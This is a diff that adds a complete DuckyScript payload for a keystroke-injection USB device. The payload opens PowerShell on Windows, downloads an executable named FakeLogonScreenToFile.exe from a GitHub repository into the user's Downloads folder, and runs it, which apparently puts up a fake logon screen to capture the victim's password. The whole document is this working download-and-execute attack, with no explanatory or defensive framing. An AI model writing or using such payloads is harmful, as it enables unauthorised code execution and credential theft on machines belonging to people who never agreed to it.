@@ -1,0 +1,15 @@
+REM Open PowerShell
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+
+REM Download the file using PowerShell
+STRING (New-Object Net.WebClient).DownloadFile("https://github.com/CodingRabbi/Ducky-script-Fake-Windows-Logon/raw/main/FakeLogonScreenToFile.exe", "$env:USERPROFILE\Downloads\file.exe")
+ENTER
+DELAY 5000
+
+REM Run the downloaded file
+STRING Start-Process "$env:USERPROFILE\Downloads\file.exe"
+ENTER
